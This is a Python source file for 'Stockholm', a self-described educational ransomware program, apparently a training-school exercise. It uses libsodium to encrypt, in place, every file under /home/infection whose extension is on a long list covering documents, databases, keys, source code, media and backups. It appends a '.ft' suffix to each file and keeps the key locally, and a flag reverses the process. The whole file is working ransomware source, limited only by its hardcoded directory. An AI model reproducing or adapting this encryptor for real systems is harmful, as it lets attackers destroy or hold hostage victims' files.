import argparse
import sys
from pathlib import Path
from pysodium import (
    crypto_secretbox,
    crypto_secretbox_open,
    randombytes,
    crypto_secretbox_NONCEBYTES,
    crypto_secretbox_KEYBYTES,
)

# List of file extensions targeted by the program.
# Used to determine which files are eligible for the encryption process.
authorized_extensions = {'.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw',
'.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp',
'.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3',
'.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf',
'.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1',
'.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar',
'.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov',
'.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd',
'.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup',
'.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx',
'.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1',
'.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx',
'.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt',
'.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx'}

# Checks whether a file has an authorized extension.
# Returns True if the file extension is allowed, otherwise returns False.
def is_valid_extension(file):
    extension = file.suffix
    return extension in authorized_extensions

# Encrypts eligible files in the target directory using the generated secret key.
# Adds a nonce to each encrypted file, changes its extension, and optionally displays output.
def dew_it(directory, secret_file, silent_mode):
    try:
        with open(secret_file, "r") as sf:
            secret_key = bytes.fromhex(sf.read().strip())
        for file in directory.iterdir():
            if file.is_file() and is_valid_extension(file):
                with open(file, "rb") as f:
                    nonce = randombytes(crypto_secretbox_NONCEBYTES)
                    encrypted_content = crypto_secretbox(f.read(), nonce, secret_key)
                with open(file, "wb") as encrypt_f:
                    encrypt_f.write(nonce)
                    encrypt_f.write(encrypted_content)
                if not silent_mode:
                    print(f'The file {file} has been infected.')
                file.rename(file.with_name(f'{file.name}.ft'))
    except Exception as e:
        print(f'Stockholm: error in the `dew_it` function: {e}')

# Displays a warning message when an existing secret key is detected.
# Stops the program execution to prevent starting a new encryption process.
def warning_message():
    print(
        "Stockholm: warning: a secret.key file already exists.\n"
        "Delete it before starting a new encryption.\n"
        "Make sure all files have been decrypted first, otherwise they will be permanently lost."
    )
    sys.exit(1)

# Starts the infection process by generating an encryption key and applying
# the encryption procedure to the target directory.
# Displays a warning if a previous key already exists and optionally suppresses output.
def infection(silent_mode):
    try:
        directory = Path('/home/infection')
        if not directory.exists():
            raise FileNotFoundError('the `infection` directory is missing from /home.')
        secret_file = Path('./secret.key')
        if secret_file.exists():
            warning_message()
        key = randombytes(crypto_secretbox_KEYBYTES)
        with open(secret_file, "w") as file:
            file.write(key.hex())
        dew_it(directory, secret_file, silent_mode)
    except Exception as e:
        print(f'Stockholm: error in the `infection` function: {e}')

# Reverses the infection process by decrypting infected files using the provided key.
# Restores the original files and optionally displays a message for each disinfected file.
def reverse_infection(argument, silent_mode):
    try:
        secret_key = bytes.fromhex(argument)
        directory = Path('/home/infection')
        if not directory.exists():
            raise FileNotFoundError('the `infection` directory is missing from /home.')
        for file in directory.iterdir():
            if file.is_file() and file.suffix == '.ft':
                with open(file, "rb") as encrypt_f:
                    nonce = encrypt_f.read(crypto_secretbox_NONCEBYTES)
                    decrypted_content = crypto_secretbox_open(encrypt_f.read(), nonce, secret_key)
                with open(file, "wb") as f:
                    f.write(decrypted_content)
                file.rename(file.with_suffix(''))
                if not silent_mode:
                    print(f'The file {file} has been disinfected.')
    except Exception as e:   
        print(f'Stockholm: error in the `reverse_infection` function: {e}')

# Validates the provided key by comparing it with the stored secret key.
# Checks the key format and returns True if the key is valid, otherwise returns False.
def is_valid_key(argument):
    try:
        with open('secret.key') as file:
            secret_key = file.read().strip()
        if len(argument) % 2 != 0 or len(argument) < 16:
            raise ValueError
        if argument != secret_key:
            raise ValueError
        return True
    except Exception as e:
        print('Stockholm: error: invalid key.')
        return False

# Creates and parses the command-line arguments provided by the user.
# Defines the available options and returns the parsed arguments object.
def parse_arguments():
    parser = argparse.ArgumentParser(description='Malware program for educational purpose only.')
    parser.add_argument('-r', type=str, help='reverse the infection')
    parser.add_argument('-s', action='store_true', help='produce no output')
    parser.add_argument('-v', action='version', version='Stockholm 1.0.0', help='display the program version')
    return parser.parse_args()

# Main entry point of the program.
# Parses command-line arguments and launches the
# appropriate process depending on the selected mode.
def main():
    args = parse_arguments()
    if args.r:
        if is_valid_key(args.r):
            reverse_infection(args.r, args.s)
    else:
        if args.s:
            infection(True)
        else:
            infection(False)

# Execute the main function only when this script is run directly
if __name__ == "__main__":
    main()
